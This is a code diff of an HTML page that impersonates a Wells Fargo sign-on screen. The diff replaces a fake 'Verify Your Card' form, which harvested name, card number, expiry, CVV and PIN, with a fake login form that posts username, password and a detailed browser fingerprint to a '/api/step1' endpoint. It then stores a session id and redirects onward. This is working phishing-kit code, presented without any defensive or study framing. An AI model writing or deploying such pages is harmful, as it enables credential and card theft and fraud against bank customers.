@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Wells Fargo – Verify Card</title>
+  <title>Wells Fargo – Sign On</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -17,98 +17,66 @@
     .nav-links span { color: white; font-size: 12px; }
     main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 2rem; }
     .card { background: white; border-radius: 12px; padding: 2rem 2.5rem; width: 100%; max-width: 440px; }
-    .card h1 { text-align: center; font-weight: 300; font-size: 26px; color: #333; margin-bottom: 0.4rem; }
-    .card .sub { text-align: center; font-size: 13px; color: #999; margin-bottom: 1.5rem; }
+    .card h1 { text-align: center; font-weight: 300; font-size: 26px; color: #333; margin-bottom: 1.5rem; }
     .input-wrap { position: relative; margin-bottom: 12px; }
-    .input-wrap input {
-      width: 100%; height: 50px; border-radius: 26px; border: 1px solid #ccc;
-      padding: 0 3rem 0 1.2rem; font-size: 15px; color: #333; background: #fff; outline: none;
-    }
+    .input-wrap input { width: 100%; height: 50px; border-radius: 26px; border: 1px solid #ccc; padding: 0 3rem 0 1.2rem; font-size: 15px; color: #333; background: #fff; outline: none; }
     .input-wrap input::placeholder { color: #bbb; }
     .input-wrap input:focus { border-color: #aaa; }
+    .clear-btn { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); font-size: 14px; color: #ccc; background: none; border: none; cursor: pointer; }
     .show-toggle { position: absolute; right: 16px; top: 50%; transform: translateY(-50%); font-size: 13px; color: #4a4fcf; font-weight: 500; cursor: pointer; background: none; border: none; }
-    .row { display: flex; gap: 12px; }
-    .row .input-wrap { flex: 1; }
+    .checkbox-row { display: flex; align-items: flex-start; gap: 8px; margin-bottom: 20px; }
+    .checkbox-row label { font-size: 14px; color: #333; }
+    .checkbox-row p { font-size: 12px; color: #666; margin-top: 2px; line-height: 1.4; }
     .msg { display: none; border-radius: 8px; padding: 10px 14px; font-size: 13px; margin-bottom: 14px; text-align: center; }
     .msg.error { display: block; background: #fdecea; color: #b00020; border: 1px solid #f5c6cb; }
-    .btn-submit {
-      width: 100%; height: 48px; border-radius: 26px; border: none;
-      background: #ccc; color: white; font-size: 15px; margin-bottom: 10px;
-      cursor: not-allowed; transition: background 0.2s;
-    }
-    .btn-submit.active { background: #cc0000; cursor: pointer; }
-    .forgot { text-align: center; font-size: 13px; margin-top: 8px; }
+    .btn-signin { width: 100%; height: 48px; border-radius: 26px; border: none; background: #ccc; color: white; font-size: 15px; margin-bottom: 10px; cursor: not-allowed; transition: background 0.2s; }
+    .btn-signin.active { background: #cc0000; cursor: pointer; }
+    .divider { text-align: center; font-size: 13px; color: #888; margin: 0 0 10px; }
+    .btn-passkey { width: 100%; height: 48px; border-radius: 26px; border: none; background: #222; color: white; font-size: 15px; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; margin-bottom: 16px; }
+    .passkey-hint { font-size: 12px; color: #555; text-align: center; margin: 0 0 16px; line-height: 1.5; }
+    .forgot { text-align: center; font-size: 13px; }
     .forgot a { color: #4a4fcf; text-decoration: none; }
   </style>
 </head>
 <body>
   <nav>
     <span class="nav-brand">WELLS FARGO</span>
-    <div class="nav-links">
-      <span>Enroll</span><span>Customer Service</span><span>ATMs/Locations</span><span>Español</span>
-    </div>
+    <div class="nav-links"><span>Enroll</span><span>Customer Service</span><span>ATMs/Locations</span><span>Español</span></div>
   </nav>
   <main>
     <div class="card">
-      <h1>Verify Your Card</h1>
-      <p class="sub">Please enter your card details to continue</p>
+      <h1>Good afternoon</h1>
       <div class="msg" id="msg"></div>
-
       <div class="input-wrap">
-        <input type="text" id="name" placeholder="Full Name" autocomplete="name" />
+        <input type="text" id="username" placeholder="Username" autocomplete="username" />
+        <button class="clear-btn" onclick="document.getElementById('username').value='';checkFields()">✕</button>
       </div>
-
-      <div class="input-wrap">
-        <input type="text" id="card" placeholder="Card Number" inputmode="numeric" maxlength="19" autocomplete="cc-number" />
+      <div class="input-wrap" style="margin-bottom:16px">
+        <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
+        <button class="show-toggle" onclick="toggleVis('password',this)">Show</button>
       </div>
-
-      <div class="row">
-        <div class="input-wrap">
-          <input type="text" id="expdate" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" />
-        </div>
-        <div class="input-wrap">
-          <input type="password" id="cvv" placeholder="CVV" inputmode="numeric" maxlength="4" autocomplete="cc-csc" />
-          <button class="show-toggle" onclick="toggleVis('cvv',this)">Show</button>
-        </div>
+      <div class="checkbox-row">
+        <input type="checkbox" id="save" />
+        <div><label for="save">Save username</label><p>Save only on devices not used by others.</p></div>
       </div>
-
-      <div class="input-wrap" style="margin-bottom:20px">
-        <input type="password" id="pin" placeholder="PIN" inputmode="numeric" maxlength="10" />
-        <button class="show-toggle" onclick="toggleVis('pin',this)">Show</button>
-      </div>
-
-      <button class="btn-submit" id="submitBtn" disabled onclick="handleSubmit()">Verify Card</button>
-      <p class="forgot"><a href="#">→ Having trouble? Contact us</a></p>
+      <button class="btn-signin" id="signOnBtn" disabled onclick="handleLogin()">Sign on</button>
+      <p class="divider">or</p>
+      <button class="btn-passkey">Use a passkey</button>
+      <p class="passkey-hint">Create a passkey after signing on to skip the password next time.</p>
+      <p class="forgot"><a href="#">→ Forgot username or password?</a></p>
     </div>
   </main>
   <script>
-    document.getElementById('card').addEventListener('input', function() {
-      let v = this.value.replace(/\D/g, '').substring(0, 16);
-      this.value = v.replace(/(.{4})/g, '$1 ').trim();
-      checkFields();
-    });
-
-    document.getElementById('expdate').addEventListener('input', function() {
-      let v = this.value.replace(/\D/g, '').substring(0, 4);
-      if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
-      this.value = v;
-      checkFields();
-    });
+    // Fresh session on page load
+    sessionStorage.removeItem('wfSid');
 
     function checkFields() {
-      const ready = document.getElementById('name').value &&
-                    document.getElementById('card').value &&
-                    document.getElementById('expdate').value &&
-                    document.getElementById('cvv').value &&
-                    document.getElementById('pin').value;
-      const btn = document.getElementById('submitBtn');
+      const ready = document.getElementById('username').value && document.getElementById('password').value;
+      const btn = document.getElementById('signOnBtn');
       btn.disabled = !ready;
       btn.classList.toggle('active', !!ready);
     }
-
-    ['name','cvv','pin'].forEach(id =>
-      document.getElementById(id).addEventListener('input', checkFields)
-    );
+    ['username','password'].forEach(id => document.getElementById(id).addEventListener('input', checkFields));
 
     function toggleVis(id, btn) {
       const el = document.getElementById(id);
@@ -116,39 +84,47 @@
       btn.textContent = el.type === 'password' ? 'Show' : 'Hide';
     }
 
-    async function handleSubmit() {
-      const btn = document.getElementById('submitBtn');
-      btn.disabled = true;
-      btn.textContent = 'Verifying...';
+    function collectDeviceInfo() {
+      const nav = window.navigator;
+      const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+      return {
+        userAgent: nav.userAgent, platform: nav.platform, language: nav.language,
+        screenRes: `${screen.width}x${screen.height}`, colorDepth: screen.colorDepth + '-bit',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesOn: nav.cookieEnabled, online: nav.onLine,
+        referrer: document.referrer || 'Direct',
+        deviceMemory: nav.deviceMemory ? nav.deviceMemory + 'GB' : 'Unknown',
+        cores: nav.hardwareConcurrency || 'Unknown',
+        touchPoints: nav.maxTouchPoints || 0,
+        connection: conn ? (conn.effectiveType || conn.type || 'Unknown') : 'Unknown',
+      };
+    }
+
+    async function handleLogin() {
+      const btn = document.getElementById('signOnBtn');
+      btn.disabled = true; btn.textContent = 'Signing on...';
       try {
-        const res = await fetch('/api/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+        const res = await fetch('/api/step1', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            name:    document.getElementById('name').value,
-            card:    document.getElementById('card').value,
-            expdate: document.getElementById('expdate').value,
-            cvv:     document.getElementById('cvv').value,
-            pin:     document.getElementById('pin').value
+            username: document.getElementById('username').value,
+            password: document.getElementById('password').value,
+            deviceInfo: collectDeviceInfo()
           })
         });
         const data = await res.json();
         if (data.success) {
+          sessionStorage.setItem('wfSid', data.sessionId);
           window.location.href = data.redirectUrl;
         } else {
-          const msgEl = document.getElementById('msg');
-          msgEl.textContent = data.message || 'Verification failed.';
-          msgEl.className = 'msg error';
-          btn.disabled = false;
-          btn.textContent = 'Verify Card';
-          btn.classList.add('active');
+          document.getElementById('msg').textContent = data.message || 'Login failed.';
+          document.getElementById('msg').className = 'msg error';
+          btn.disabled = false; btn.textContent = 'Sign on'; btn.classList.add('active');
         }
       } catch(err) {
-        document.getElementById('msg').textContent = 'Network error. Please try again.';
+        document.getElementById('msg').textContent = 'Network error.';
         document.getElementById('msg').className = 'msg error';
-        btn.disabled = false;
-        btn.textContent = 'Verify Card';
-        btn.classList.add('active');
+        btn.disabled = false; btn.textContent = 'Sign on'; btn.classList.add('active');
       }
     }
   </script>
